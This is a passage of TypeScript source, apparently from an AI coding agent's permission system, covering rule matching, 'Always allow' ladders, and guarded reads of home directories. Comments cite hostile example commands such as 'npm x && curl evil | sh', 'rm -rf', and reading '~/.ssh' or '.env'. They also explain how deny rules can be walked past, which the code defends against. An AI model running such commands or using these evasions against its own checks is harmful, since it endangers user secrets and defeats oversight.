import { realpathSync } from 'fs';
import { isAbsolute, relative, sep } from 'path';
import type { ResolvedSettings } from './settings.js';
import type {
  PermissionDecision,
  PermissionResult,
  ReadOnlyRoot,
  ToolCall,
} from './types/tools.js';
import { canonicalToolName } from './tools/aliases.js';
import { getPrimaryArg } from './tools/primary-arg.js';
import { globToRegex, globWalkBases } from './tools/glob-regex.js';
import { parsePatch, type PatchOperation } from './tools/patch.js';
import {
  canonicalizePath,
  isBookLocalSettingsPath,
  isUnderRoot,
  resolveReadablePathDetail,
  resolveWorkspacePath,
  type PathRoots,
  type ReadablePathDetail,
} from './tools/path-utils.js';
import { containsPath, pathHoldsHome, rootHoldsHome } from './additional-roots.js';
import { sandboxCoverage } from './sandbox.js';

/**
 * Parse a permission rule string like "Bash(git *)" or "Read(./.env)" into
 * { toolName, pattern }. The pattern is a glob matched against the tool's
 * primary argument. A bare "Tool" (no parens) means match any argument.
 * Empty parens "Tool()" also means match any argument.
 */
export interface ParsedRule {
  toolName: string;
  /** Glob pattern for the primary argument, or null for match-all. */
  pattern: string | null;
}

export interface PermissionVerdict {
  decision: 'allow' | 'deny' | 'ask' | 'refuse';
  matchedRule?: string;
  source?: 'allow' | 'deny' | 'ask' | 'default' | 'sandbox' | 'workspace';
  /**
   * Set on a Read, Glob or Grep whose target the tool itself refuses (outside the workspace and
   * every honored root): no approval can make it work, so the loop blocks it instead of prompting.
   * Only set where reads are judged.
   */
  outsideWorkspace?: boolean;
  /**
   * Set instead, on a target a root *serves* but whose subpath the tools exclude. A different
   * reason and a different remedy from {@link outsideWorkspace}: the directory is reachable and
   * this path under it is not, so naming a directory to add would be a dead end.
   */
  excludedPath?: boolean;
}

/** The workspace a call's path arguments are judged against (#264). */
export interface WorkspaceScope {
  /** The workspace root, as the file tools resolve paths against it. */
  root: string;
  /** The root after following links, when the caller has resolved it once; resolved here if not. */
  realRoot?: string;
  /**
   * Directories outside the workspace that the Read tool may open (Book's memory directory),
   * exactly as `ToolContext.readOnlyRoots`, so a Read is judged by the rule the tool applies.
   */
  readOnlyRoots?: readonly (string | ReadOnlyRoot)[];
  /**
   * Honored `additionalDirectories`, as the resolved real roots the file tools resolve against
   * (`ToolContext.additionalRoots`). Read+write: a read is auto-allowed exactly as a workspace
   * read is, and a write goes through the ordinary permission flow for its mode.
   */
  additionalRoots?: readonly string[];
  /**
   * The real paths of the home directories under which a read keeps asking, resolved once per run
   * (`homeGuards()`). A read outside every root is refused; a read inside one of these is served,
   * but only through a root that *holds* that home, and only when the path lands inside it.
   *
   * Keyed on the root that serves the resolved target, so a home held as a subdirectory of an
   * honored root is covered: a home holds SSH and provider keys and Book's own trust store, and the
   * one thing `additionalDirectories` widens is exactly which paths a read may reach without asking.
   * A root that merely sits *below* the home — which is nearly every workspace — is not guarded by
   * it; that is `workspaceHoldsHome`, and it asks for everything either way.
   */
  homeGuards?: readonly string[];
  /**
   * Whether to judge what a Read, Glob or Grep reaches at all: true in the modes that prompt for
   * them (`WORKSPACE_READ_JUDGING_MODES`), so a refusal can say when no approval could help.
   */
  judgeReads: boolean;
  /**
   * Whether to judge what a Read, Glob or Grep reaches purely to refuse a target no root serves,
   * whatever the mode does with a target it *can* serve (`WORKSPACE_READ_REFUSAL_MODES`).
   *
   * Wider than {@link judgeReads} by `dontAsk`, and deliberately so. That mode refuses every call
   * that would need approval, so the refusal happens either way; what changes is what it says.
   * Judged as `permission_denied` it told the model to ask for a rule, and the `all_tools_blocked`
   * stop message for a streak of them advises an allow rule that can never make `Read` serve a
   * path outside every root. Judged as a target, it is refused the way the other modes refuse it,
   * with the directory that would serve it. Only the *kind* of refusal moves: a workspace read
   * with no allow rule is still refused in `dontAsk`, because `autoAllowReads` is off there and
   * the owner decided that is the right answer.
   */
  refuseUnreachableReads: boolean;
  /**
   * Whether a target the tool can serve runs without a prompt. Takes effect only with
   * `judgeReads`; false for a workspace that holds a home directory.
   */
  autoAllowReads: boolean;
}

/**
 * Seams for permission evaluation. `sandboxBackendAvailable` exists so tests can
 * exercise the missing-bwrap branch on a host that has bwrap installed; nothing
 * in production passes it. `workspace` is the scope a call's paths are judged in.
 */
export interface PermissionEvaluationOptions {
  sandboxBackendAvailable?: () => boolean;
  workspace?: WorkspaceScope;
}

/** Read-only file tools whose targets inside the workspace need no prompt (#264). */
/**
 * The tools that read the filesystem, and so are judged by the read rules. Narrower than
 * `READ_ONLY_PLAN_TOOLS` in `plan-mode.ts`, which also holds the plan-control and session tools:
 * those return `ask` for reasons unrelated to what they would read, and a loop that treated any
 * of them as a guarded read would prompt for `ExitPlanMode` (PR #334 finding 5).
 */
export const WORKSPACE_READ_TOOLS: ReadonlySet<string> = new Set(['Read', 'Glob', 'Grep']);

/** Tools whose rules name one file path, so a rule must match the file however it is spelled. */
const PATH_RULE_TOOLS: ReadonlySet<string> = new Set([
  'Read',
  'Write',
  'Edit',
  'MultiEdit',
  'NotebookEdit',
]);

/**
 * Permission modes in which a Read, Glob or Grep target is judged at all, so a target the tool
 * cannot serve is refused instead of prompted for (#264, then #305 item 3).
 *
 * `plan` joined the set when it started judging reads the way `default` does: a plan is written
 * by reading, and an outside target cannot be read in a plan either. `auto` and
 * `bypassPermissions` ask about nothing, so there is nothing there to refuse early.
 */
export const WORKSPACE_READ_JUDGING_MODES: ReadonlySet<string> = new Set([
  'default',
  'accept-edits',
  'plan',
]);

/**
 * Modes in which a Read, Glob or Grep target no root serves — or one a root excludes — is refused
 * rather than decided as a permission (#264, then #305 item 3, then PR #334).
 *
 * Every mode in {@link WORKSPACE_READ_JUDGING_MODES}, and `dontAsk` beside it. `dontAsk` prompts
 * for nothing, so there is no prompt to raise for an unservable target, but the call is refused
 * all the same — and refused as `permission_denied` it was told to ask for a permission, which no
 * rule or mode can grant for a path outside every root. Refusing it as the target it is gives the
 * same `path_outside_workspace` message, and the same remedy, the other modes give (#305 item 3).
 *
 * `auto` and `bypassPermissions` ask about nothing and reach every call, so there is nothing to
 * refuse early: the file tools answer for themselves, as they always did.
 */
export const WORKSPACE_READ_REFUSAL_MODES: ReadonlySet<string> = new Set([
  ...WORKSPACE_READ_JUDGING_MODES,
  'dontAsk',
]);

/**
 * Read-only Git tools that report on the repository without changing it. They run in the
 * workspace root, read no path the user names, and execute nothing the repository's own git
 * config can redirect (see `runGit`), so they need no prompt in the modes that judge calls.
 *
 * Exported so the argument review in `tools/git.ts` can be asserted against this list rather
 * than kept in step by hand: a tool added here and not there would be auto-allowed without
 * anyone having read what it runs.
 */
export const WORKSPACE_READ_ONLY_GIT_TOOLS: ReadonlySet<string> = new Set([
  'GitStatus',
  'GitDiff',
  'GitLog',
  'GitBranch',
]);

export function parseRule(rule: string): ParsedRule {
  const parenIdx = rule.indexOf('(');
  if (parenIdx === -1) {
    return { toolName: rule.trim(), pattern: null };
  }
  const toolName = rule.slice(0, parenIdx).trim();
  const closeIdx = rule.lastIndexOf(')');
  if (closeIdx === -1 || closeIdx <= parenIdx) {
    // Malformed — treat as bare tool name.
    return { toolName, pattern: null };
  }
  const pattern = rule.slice(parenIdx + 1, closeIdx).trim();
  return { toolName, pattern: pattern.length === 0 ? null : pattern };
}

/**
 * Normalize a path-like string for matching: strip leading `./` so that
 * `./.env` and `.env` are equivalent. Non-path args (commands, queries)
 * pass through unchanged.
 */
function normalizePathArg(s: string): string {
  if (s.startsWith('./')) return s.slice(2);
  return s;
}

/**
 * Check whether a parsed rule matches a tool call. Both the rule pattern
 * and the primary argument are path-normalized (leading `./` stripped) for
 * Read/Write/Edit-style tools so `Read(./.env)` matches a call with
 * `filePath: ".env"`.
 */
function toolNameMatchesRule(ruleToolName: string, toolName: string): boolean {
  if (ruleToolName === toolName) return true;
  if (!ruleToolName.startsWith('mcp__')) return false;
  const serverName = ruleToolName.slice('mcp__'.length);
  // A bare MCP server namespace (mcp__github) intentionally covers every
  // tool from that server. A full tool rule remains exact.
  return Boolean(
    serverName && !serverName.includes('__') && toolName.startsWith(`${ruleToolName}__`),
  );
}

/**
 * Fold case for a `deny` or `ask` path rule, on every platform (#305 item 1).
 *
 * On WSL's `/mnt/c` and any other case-insensitive mount, `Read .ENV` opens the same file a
 * `deny: ["Read(.env)"]` was written to stop, so a case-sensitive comparison lets the rule be
 * walked straight past. Folding on a case-sensitive file system only makes these two lists
 * stricter, which is the direction they can afford to move: they restrict. `allow` keeps exact
 * matching, because folding there would widen what a rule permits.
 */
const caseFoldingPathRule = (value: string): string => value.toLowerCase();

/**
 * Match a parsed rule against a tool name and the argument spellings to test.
 *
 * `fold` is set for the restricting lists (`deny`, `ask`) on a path-rule tool, where the pattern
 * and every candidate are compared case-insensitively; see {@link caseFoldingPathRule}.
 */
function ruleMatchesCandidate(
  rule: ParsedRule,
  toolName: string,
  primaryArg: string,
  fold: boolean,
): boolean {
  if (!toolNameMatchesRule(rule.toolName, toolName)) return false;
  if (rule.pattern === null) return true; // match-all
  const normalizedArg = normalizePathArg(primaryArg);
  const normalizedPattern = rule.pattern.startsWith('./') ? rule.pattern.slice(2) : rule.pattern;
  if (!fold) return globToRegex(normalizedPattern).test(normalizedArg);
  return globToRegex(caseFoldingPathRule(normalizedPattern)).test(
    caseFoldingPathRule(normalizedArg),
  );
}

function ruleMatches(rule: ParsedRule, toolName: string, primaryArg: string): boolean {
  return ruleMatchesCandidate(rule, toolName, primaryArg, false);
}

/**
 * The rule that remembers exactly this call, or `undefined` when the call has no
 * primary argument to scope one to.
 *
 * A bare tool name means "every call of this tool", so a call whose primary argument
 * is empty must not produce one: `{command: ""}` and `{command: "\nrm -rf x"}` both
 * pass the schema, `getPrimaryArg` reads nothing out of either, and an "Always" on
 * them would have written a `Bash` rule allowing every shell command from then on.
 * The call is still allowed; nothing is remembered.
 */
export function permissionRuleForToolCall(call: ToolCall): string | undefined {
  const toolName = canonicalToolName(call.name);
  const primaryArg = getPrimaryArg(call.arguments);
  if (toolName === 'WebSearch') return toolName;
  if (toolName === 'WebFetch' && primaryArg) {
    try {
      const url = new URL(primaryArg);
      return `${toolName}(${url.origin}/**)`;
    } catch {
      // An invalid URL must not widen into a tool-wide permission.
    }
  }
  if (!primaryArg) return undefined;
  return `${toolName}(${primaryArg})`;
}

/**
 * Read an approver's answer, which may be a bare result or one naming a rule.
 *
 * Approvers that cannot widen a scope — the print-mode prompt, managed agents —
 * keep returning the string, so only the surface that offers the choice has to
 * know the richer shape exists.
 */
export function permissionResultOf(decision: PermissionResult | PermissionDecision) {
  return typeof decision === 'string' ? decision : decision.result;
}

/** The rule an approver picked, or `undefined` to derive it from the call. */
export function permissionRuleOf(
  decision: PermissionResult | PermissionDecision,
): string | undefined {
  return typeof decision === 'string' ? undefined : decision.rule;
}

/** Why an approver refused, when it says; see `PermissionDecision.reason`. */
export function permissionReasonOf(
  decision: PermissionResult | PermissionDecision,
): PermissionDecision['reason'] {
  return typeof decision === 'string' ? undefined : decision.reason;
}

/** How many rules the "Always allow" scope ladder may offer, exact included. */
const RULE_LADDER_MAX = 3;

/**
 * Shell characters that chain or redirect one command into another.
 *
 * A widened rule is a glob over the whole command string and `*` crosses
 * anything, so `Bash(npm *)` would also match `npm x && curl evil | sh`. Book
 * cannot express "and nothing else" in its glob language, so it declines to
 * offer a widened rule when the command it learned from is already a compound
 * one: the user would be generalizing from an example whose shape they cannot
 * see repeated.
 */
const SHELL_CHAINING = /[;&|><`$(){}\n]/;

/**
 * Rules the "Always allow" button may write, narrowest first.
 *
 * The exact rule is always first and is what the button offers by default. For
 * a shell command it is also nearly useless: `Bash(npm run check)` matches that
 * byte sequence and nothing else, so a user who pressed "Always allow" to stop
 * being asked was asked again on the very next call. The remaining entries drop
 * one trailing token at a time — `npm run check` offers `npm run *` then
 * `npm *` — and the caller must show the pattern it is about to write, because
 * the difference between these is the whole decision.
 *
 * Only Bash gets a ladder. Paths are already reusable as written, and WebFetch
 * globs its own origin in {@link permissionRuleForToolCall}. The list is empty
 * when the call has no primary argument to scope a rule to, and a caller reads
 * that as "remember nothing".
 */
export function permissionRuleLadder(call: ToolCall): string[] {
  const exact = permissionRuleForToolCall(call);
  if (!exact) return [];
  if (canonicalToolName(call.name) !== 'Bash') return [exact];

  const command = getPrimaryArg(call.arguments).trim();
  if (!command || SHELL_CHAINING.test(command)) return [exact];

  const tokens = command.split(/\s+/);
  const ladder = [exact];
  for (let take = tokens.length - 1; take >= 1 && ladder.length < RULE_LADDER_MAX; take -= 1) {
    const prefix = `Bash(${tokens.slice(0, take).join(' ')} *)`;
    if (!ladder.includes(prefix)) ladder.push(prefix);
  }
  return ladder;
}

export function permissionRuleMatchesCall(rule: string, call: ToolCall): boolean {
  const toolName = canonicalToolName(call.name);
  const primaryArg = getPrimaryArg(call.arguments);
  if (toolName === 'WebFetch' && primaryArg) {
    try {
      // URL.toString() gives origin roots a trailing slash, matching the remembered origin glob.
      return ruleMatches(parseRule(rule), toolName, new URL(primaryArg).toString());
    } catch {
      // Invalid URLs retain the normal raw-argument matching behavior.
    }
  }
  return ruleMatches(parseRule(rule), toolName, primaryArg);
}

function patchOperations(args: Record<string, unknown>): PatchOperation[] {
  const parsed = parsePatch(args.patch);
  return 'operations' in parsed ? parsed.operations : [];
}

function ruleMatchesPatch(rule: ParsedRule, paths: readonly string[], fold: boolean): boolean {
  return paths.some((path) => ruleMatchesCandidate(rule, rule.toolName, path, fold));
}

function patchRuleSupportsOperation(rule: ParsedRule, operation: PatchOperation): boolean {
  if (rule.toolName === 'ApplyPatch') return true;
  if (rule.toolName === 'Edit') return operation.kind === 'update';
  if (rule.toolName === 'Write') return operation.kind === 'update' || operation.kind === 'add';
  return false;
}

function compatiblePatchRuleMatches(
  rule: ParsedRule,
  operations: PatchOperation[],
  spellingsOf: (path: string, restrictive: boolean) => readonly string[],
  fold: boolean,
): boolean {
  if (!['ApplyPatch', 'Edit', 'Write'].includes(rule.toolName)) return false;
  if (rule.toolName === 'ApplyPatch' && rule.pattern === null) return true;
  return operations.some(
    (operation) =>
      patchRuleSupportsOperation(rule, operation) &&
      (rule.pattern === null || ruleMatchesPatch(rule, spellingsOf(operation.path, fold), fold)),
  );
}

/**
 * Extract the primary argument from a tool call for rule matching.
 * Delegates to the shared getPrimaryArg utility.
 */
export function primaryArgForRule(_toolName: string, args: Record<string, unknown>): string {
  return getPrimaryArg(args);
}

/**
 * Has the user asked to be consulted about anything at all?
 *
 * A shell command line is not a primary argument the way a file path is: one
 * line can read a file, write a file, reach the network, and chain three more
 * commands behind `&&`. A `deny` or `ask` glob therefore only ever matches the
 * shapes the user thought to write down — `deny: ["Bash(rm *)"]` does not match
 * `true && rm -rf .` — and it is the *default ask* underneath that catches
 * everything the glob missed, including the same action performed through a
 * different tool (`cat .env` against a `Read` deny, `curl` against a `WebFetch`
 * deny).
 *
 * So the presence of any hand-written deny/ask rule is treated as the user
 * saying "adjudicate my shell commands", and the default ask stays. Removing it
 * would turn every such rule from a floor into a list of exact strings to avoid.
 */
export function hasAdjudicationPolicy(settings: ResolvedSettings): boolean {
  return settings.permissions.deny.length > 0 || settings.permissions.ask.length > 0;
}

/**
 * Would `sandbox.autoAllowBashIfSandboxed` allow this call without a prompt?
 *
 * True only for a Bash call whose exact command text genuinely executes inside
 * a bubblewrap namespace. The command is read straight off `args.command` and
 * trimmed — byte-for-byte what `buildEffectiveCommand` in tools/shell.ts
 * matches against `excludedCommands` — rather than through `getPrimaryArg`,
 * which truncates to the first line. Judging a different string here than the
 * Bash tool judges is how "sandboxed, so auto-allow" and "excluded, so run it
 * on the host" end up applying to the same call.
 *
 * It is also true only when the user wrote no deny/ask rules at all
 * ({@link hasAdjudicationPolicy}). The bubblewrap namespace binds the workspace
 * read-write and shares the host network unless a domain policy is declared, so
 * "sandboxed" bounds the blast radius to the workspace — it does not make the
 * command harmless, and it is not a substitute for a prompt the user asked for.
 */
function sandboxAutoAllows(
  toolName: string,
  args: Record<string, unknown>,
  settings: ResolvedSettings,
  options: PermissionEvaluationOptions,
): boolean {
  if (!settings.sandbox.autoAllowBashIfSandboxed) return false;
  if (canonicalToolName(toolName) !== 'Bash') return false;
  if (hasAdjudicationPolicy(settings)) return false;
  const command = typeof args.command === 'string' ? args.command.trim() : '';
  if (!command) return false;
  return sandboxCoverage(command, settings.sandbox, options.sandboxBackendAvailable).sandboxed;
}

const toPosix = (value: string) => value.replace(/\\/g, '/');

/** The workspace root after following links, or `undefined` if it cannot be resolved. */
function realRootOf(scope: WorkspaceScope): string | undefined {
  if (scope.realRoot) return scope.realRoot;
  try {
    return realpathSync.native(scope.root);
  } catch {
    return undefined;
  }
}

/** The file path a path-rule tool acts on. The loop normalizes argument aliases beforehand. */
function pathArgument(toolName: string, args: Record<string, unknown>): string | undefined {
  const value = toolName === 'NotebookEdit' ? args.notebook_path : args.filePath;
  return typeof value === 'string' && value.trim() !== '' ? value : undefined;
}

/**
 * Does any rule name this tool? Only then is a call's path worth resolving to its other
 * spellings: resolving touches the file system, and most calls meet no rule at all.
 */
function rulesName(lists: ParsedRuleLists, toolName: string): boolean {
  return [...lists.deny, ...lists.ask, ...lists.allow].some(
    ({ parsed }) => parsed.toolName === toolName,
  );
}

/**
 * A call's path arguments, resolved at most once each for one evaluation.
 *
 * A Read used to be resolved up to three times per call: once for the rule spellings, once for
 * `readToolTarget`, and once more by the tool itself, each of which walks to the nearest existing
 * ancestor and resolves links. Resolving is the most expensive thing a permission check does and
 * the three answers were required to agree — two of them resolved a moment apart, so a link
 * repointed in between judged one call two different ways. Here the results are computed once
 * and shared; nothing is cached across evaluations, so a path that changes between turns is
 * re-resolved the next turn.
 */
interface ResolvedPathScope {
  scope: WorkspaceScope;
  /** Roots a read may use, in the order the file tools try them. */
  roots(includeReadOnly: boolean): PathRoots;
  /** Where a path lands, resolved once and remembered. */
  detail(raw: string, includeReadOnly: boolean): ResolvedPathDetail;
  /**
   * Whether a canonical path is one a read may not reach without asking: Book's own local
   * settings under any root, or a path inside a home directory held by the root that serves it.
   */
  isGuarded(canonicalPath: string): boolean;
  /** Whether a Grep or Glob scope reaches a guarded home; see {@link ResolvedPathScope}. */
  scopeReachesHome(canonicalScope: string): boolean;
}

/** Where a path lands: a resolved file, or the reason no tool may serve it. */
type ResolvedPathDetail = ReadablePathDetail;

function resolvedPathScope(scope: WorkspaceScope): ResolvedPathScope {
  const detailCache = new Map<string, ResolvedPathDetail>();
  const rootsFor = (includeReadOnly: boolean): PathRoots => ({
    workspaceRoot: scope.root,
    readOnlyRoots: includeReadOnly ? scope.readOnlyRoots : undefined,
    additionalRoots: scope.additionalRoots,
  });
  // Fixed for the evaluation: the roots that hold a home directory of their own, and so may serve a
  // guarded path. Empty for the ordinary case, which is why the common read costs one check.
  // Computed once per root, where the roots are resolved, rather than per evaluation: each
  // `rootHoldsHome` is a `realpath` walk, and a read is judged against a serving root on every
  // call. The roots do not change while a scope lives.
  const holdsHomeByRoot = new Map<string, boolean>();
  const holdsHome = (root: string): boolean => {
    let known = holdsHomeByRoot.get(root);
    if (known === undefined) {
      known = rootHoldsHome(root, scope.homeGuards ?? []);
      holdsHomeByRoot.set(root, known);
    }
    return known;
  };
  const guardedRoots = [scope.root, ...(scope.additionalRoots ?? [])].filter(holdsHome);
  // Which root serves a canonical path, in the order the file tools resolve against them: the
  // workspace first, then the approved directories. The home guard is about the *serving* root,
  // not about every root that happens to contain the path — approving `/home/u` must not re-guard
  // a workspace at `/home/u/proj` that it merely sits above (PR #334 finding 3). Compared in one
  // canonical form on both sides, because the path came from `realpath` and the root is as given.
  const servingRootOf = (canonicalPath: string): string | undefined =>
    [realRootOf(scope), ...(scope.additionalRoots ?? [])].find(
      (root): root is string =>
        typeof root === 'string' && root.length > 0 && isUnderRoot(canonicalPath, root),
    );
  return {
    scope,
    roots: rootsFor,
    detail: (raw, includeReadOnly) => {
      // The cache is keyed by the raw path alone, so a Read and the rule spellings that share
      // one path argument share the resolution; the two only ever differ in which roots they
      // consult, and a Read is the only caller that passes `true` for both.
      const key = `${includeReadOnly ? 'r' : 'w'}\0${raw}`;
      let known = detailCache.get(key);
      if (!known) {
        known = resolveReadablePathDetail(rootsFor(includeReadOnly), raw);
        detailCache.set(key, known);
      }
      return known;
    },
    isGuarded: (canonicalPath) => {
      const roots = [realRootOf(scope), ...(scope.additionalRoots ?? [])].filter(
        (root): root is string => typeof root === 'string' && root.length > 0,
      );
      // Every root Book serves, not only the workspace: an honored directory carries its own
      // `.book/settings.local.json`, which can hold an API key just as the workspace's does.
      if (roots.some((root) => isBookLocalSettingsPath(canonicalPath, root, { directory: true })))
        return true;
      // The home rule has two halves, and both are load-bearing. The path must land inside a home
      // directory, and the root that *serves* it must hold that home. A root that merely sits
      // below the home — which is nearly every workspace and nearly every project directory —
      // holds nothing and guards nothing; without the first half a workspace under the home would
      // ask for every file it owns, and without the second an approved directory holding a home
      // would be guarded in its entirety, which is not what was approved.
      if (guardedRoots.length === 0) return false;
      if (!pathHoldsHome(canonicalPath, scope.homeGuards ?? [])) return false;
      const serving = servingRootOf(canonicalPath);
      return serving !== undefined && holdsHome(serving);
    },
    /**
     * Whether a Grep or Glob *scope* can reach a guarded home. A scope is a subtree, not a file,
     * so it is guarded when the guarded home is inside it as well as when it is inside the home:
     * `Grep {path: "/home"}` reads `~/.ssh` without naming a single file under it (PR #334
     * finding 4). Compared canonically, both ways, because either side may be reached by a link.
     */
    scopeReachesHome: (canonicalScope) => {
      const homes = scope.homeGuards ?? [];
      // The scope *contains* a guarded home, or *is* one. A scope that merely sits *below* a home
      // — which is nearly every workspace and project directory — does not reach it:
      // `containsPath` returning true for "home contains scope" is the descent case and is
      // deliberately not consulted here, or the guard would fire on every ordinary read again.
      // This is the reported walk: `Grep {path: "/home"}` prints lines from `~/.ssh` and
      // `~/.book` without naming a file under them, and the scope reaches them by containing the
      // home.
      if (homes.some((home) => containsPath(canonicalScope, home))) return true;
      // And the scope sits inside a root that holds a home, so every file it walks is guarded.
      return guardedRoots.some((root) => containsPath(root, canonicalScope));
    },
  };
}

/**
 * The other spellings of a target path that a rule may have been written against: relative to the
 * root it lands in and absolute, with forward slashes. Inside the workspace that is the
 * workspace-relative form, the absolute path as written, the absolute path after links, and the
 * same relative form against the real workspace root. Outside it, the roots a tool may serve
 * contribute their two absolute spellings — and only the ones they serve, which is why a write
 * that lands in an honored directory gets spellings while a Read into the memory inbox does not.
 *
 * `restrictive` is true for `deny` and `ask`, and it adds the form relative to an honored root the
 * path lands in. A rule written against the workspace — `Write(.env)` — means the `.env` of the
 * root the call writes into, and without this the same rule matched in the workspace and silently
 * did not in `/srv/app` (PR #334 finding 10). It is deliberately *not* added for `allow`: a rule
 * that widens must not acquire a new meaning, or `Edit(src/**)` would come to cover
 * `/srv/app/src/...` — a grant the user never wrote.
 */
function spellingsOfPath(
  paths: ResolvedPathScope,
  raw: string,
  includeReadOnly: boolean,
  restrictive: boolean,
): string[] {
  const spellings: string[] = [];
  const detail = paths.detail(raw, includeReadOnly);
  if (!('path' in detail)) return [];
  const resolved = detail.path;
  const inWorkspace = resolveWorkspacePath(paths.scope.root, raw) !== null;
  if (inWorkspace) {
    spellings.push(
      resolved.relativePath,
      toPosix(resolved.filePath),
      toPosix(resolved.canonicalPath),
    );
    const realRoot = realRootOf(paths.scope);
    if (realRoot) spellings.push(toPosix(relative(realRoot, resolved.canonicalPath)));
  } else {
    spellings.push(toPosix(resolved.filePath), toPosix(resolved.canonicalPath));
    if (restrictive) {
      for (const root of paths.scope.additionalRoots ?? []) {
        // The root in the path's own canonical form: the path came from `realpath`, and a root as
        // given is a second spelling of it (8.3 short form, drive-letter case, separators) rather
        // than a different place — comparing the two spellings read every relative form as `..`.
        const fromRoot = relative(canonicalizePath(root), resolved.canonicalPath);
        // `..` followed by a separator, not a bare prefix: a sibling directory whose name merely
        // starts with two dots (`..foo`) is inside the root, and `startsWith('..')` calls it
        // outside.
        if (
          !fromRoot ||
          isAbsolute(fromRoot) ||
          fromRoot === '..' ||
          fromRoot.startsWith(`..${sep}`)
        ) {
          continue;
        }
        spellings.push(toPosix(fromRoot));
      }
    }
  }
  return [...new Set(spellings)].filter((spelling) => spelling !== '' && spelling !== raw);
}

/** The other spellings of a path-rule tool's target; see `spellingsOfPath`. */
function pathRuleSpellings(
  paths: ResolvedPathScope,
  toolName: string,
  args: Record<string, unknown>,
  restrictive: boolean,
): string[] {
  const raw = pathArgument(toolName, args);
  return raw ? spellingsOfPath(paths, raw, toolName === 'Read', restrictive) : [];
}

/**
 * Where a Glob reaches: `outside` when the walk would start anywhere outside the roots the tools
 * serve (`../**`, `.{.,x}/*`, an absolute path elsewhere), `servable` otherwise. It asks the
 * matcher for the directories the walk would start in rather than guessing from the pattern:
 * `{a,b}/*` walks the workspace and never climbs, while `.{.,x}/*` walks its parent. A pattern the
 * matcher cannot read at all is `outside`: the walk it would do is unknown, so nothing it finds
 * can be claimed to be inside.
 */
function globTarget(pattern: string, paths: ResolvedPathScope): 'servable' | 'outside' {
  const bases = globWalkBases(pattern);
  if (bases.length === 0) return 'outside';
  // Every base, including the ones that resolved nowhere: a pattern with an unresolvable base
  // walks outside the roots, and dropping that base before the test would make `every` vacuously
  // true and read as servable.
  return bases.every((base) => 'path' in paths.detail(base, false)) ? 'servable' : 'outside';
}

/**
 * The directories a Glob would walk, canonicalized.
 *
 * The matcher answers this better than a pattern could be parsed for: `{a,b}/*` walks the
 * workspace and never climbs, while `.{.,x}/*` walks its parent, and only the library knows which
 * before the walk happens. The bases are read from the same converted pattern the walk uses, so
 * the two name the same directory even on Windows, where an unconverted pattern reports `.` for
 * every base and would make an absolute pattern look like it walked the workspace.
 */
function globBases(pattern: string, paths: ResolvedPathScope): string[] {
  return globWalkBases(pattern)
    .map((base) => paths.detail(base, false))
    .filter((detail): detail is Extract<typeof detail, { path: unknown }> => 'path' in detail)
    .map((detail) => detail.path.canonicalPath);
}

/**
 * What a Read, Glob or Grep call reaches, judged the way the tool judges it: `servable` (the tool
 * can serve it), `outside` (no root contains it, so no approval could make the tool open it),
 * `guarded` (Book's own local settings, or a root that holds a home directory, which keep asking),
 * `hidden` (a root that excludes this subpath, the memory inbox, which also keeps asking), or
 * `none` (no target to judge; the tool rejects the call itself).
 */
function readToolTarget(
  toolName: string,
  args: Record<string, unknown>,
  paths: ResolvedPathScope,
): 'servable' | 'outside' | 'guarded' | 'hidden' | 'none' {
  if (toolName === 'Read') {
    const raw = pathArgument(toolName, args);
    if (!raw) return 'none';
    const detail = paths.detail(raw, true);
    if (!('path' in detail)) return detail.reason === 'excluded' ? 'hidden' : 'outside';
    return paths.isGuarded(detail.path.canonicalPath) ? 'guarded' : 'servable';
  }
  if (toolName === 'Glob') {
    const pattern = typeof args.pattern === 'string' ? args.pattern.trim() : '';
    if (!pattern) return 'none';
    const target = globTarget(pattern, paths);
    // A Glob is a subtree walk, so its bases are scopes, not files: guarded the same way a Grep
    // scope is (PR #334 finding 4).
    if (target === 'servable' && globBases(pattern, paths).some(paths.scopeReachesHome))
      return 'guarded';
    return target;
  }
  // Grep: no path, or `.`, searches the workspace. Grep never reads Book's memory directory.
  const raw = typeof args.path === 'string' ? args.path.trim() : '';
  if (raw === '' || raw === '.') return 'servable';
  const detail = paths.detail(raw, false);
  if (!('path' in detail)) return detail.reason === 'excluded' ? 'hidden' : 'outside';
  if (paths.isGuarded(detail.path.canonicalPath)) return 'guarded';
  // The scope is a directory: guarding only the directory path itself would let `Grep
  // {path: "/home"}` print lines from `~/.ssh` without naming a file under it.
  return paths.scopeReachesHome(detail.path.canonicalPath) ? 'guarded' : 'servable';
}

/**
 * One entry of a rule list, parsed once.
 *
 * Every rule string was re-parsed on every call it was tested against, and each call was tested
 * once per candidate spelling of its path — so a Read of `.env` with ten `Read` rules spent
 * forty `parseRule` calls to make one decision. The parse is a pair of `indexOf`/`slice` calls
 * whose result depends only on the string, so it is done once here and the parsed rules are what
 * the three loops below read. The original text rides along because a verdict reports the rule
 * the user wrote, not a reconstruction of it.
 */
interface ListedRule {
  text: string;
  parsed: ParsedRule;
}

interface ParsedRuleLists {
  deny: ListedRule[];
  ask: ListedRule[];
  allow: ListedRule[];
}

function parseRuleLists(settings: ResolvedSettings): ParsedRuleLists {
  const list = (texts: readonly string[]): ListedRule[] =>
    texts.map((text) => ({ text, parsed: parseRule(text) }));
  return {
    deny: list(settings.permissions.deny),
    ask: list(settings.permissions.ask),
    allow: list(settings.permissions.allow),
  };
}

/**
 * Has the user written a deny or ask rule about reading? A Grep or Glob reads files a `Read` rule
 * cannot see (`Grep` with `path: ".env"` returns every line), so while one exists they keep the
 * default prompt, the way `sandboxAutoAllows` steps aside for any adjudication policy.
 */
function hasReadAdjudication(lists: ParsedRuleLists): boolean {
  return [...lists.deny, ...lists.ask].some(({ parsed }) =>
    WORKSPACE_READ_TOOLS.has(parsed.toolName),
  );
}

/**
 * Evaluate permission rules against a tool call. Rules are evaluated in
 * CC's order: deny → ask → allow. First match wins.
 *
 * Returns 'allow', 'deny', or 'ask' (the default when no rule matches), or `refuse` for a
 * Read, Glob or Grep target no tool may serve, which no rule and no mode can make servable.
 */
export function evaluatePermission(
  toolName: string,
  args: Record<string, unknown>,
  settings: ResolvedSettings,
  options: PermissionEvaluationOptions = {},
): PermissionVerdict['decision'] {
  return evaluatePermissionDetail(toolName, args, settings, options).decision;
}

export function evaluatePermissionDetail(
  toolName: string,
  args: Record<string, unknown>,
  settings: ResolvedSettings,
  options: PermissionEvaluationOptions = {},
): PermissionVerdict {
  const scope = options.workspace;
  // One resolver per evaluation: every path this call is judged by is resolved once and shared
  // between the rule spellings and the read-target judgment. Nothing survives the call, so the
  // next evaluation resolves again.
  const paths = scope ? resolvedPathScope(scope) : undefined;
  const parsed = parseRuleLists(settings);

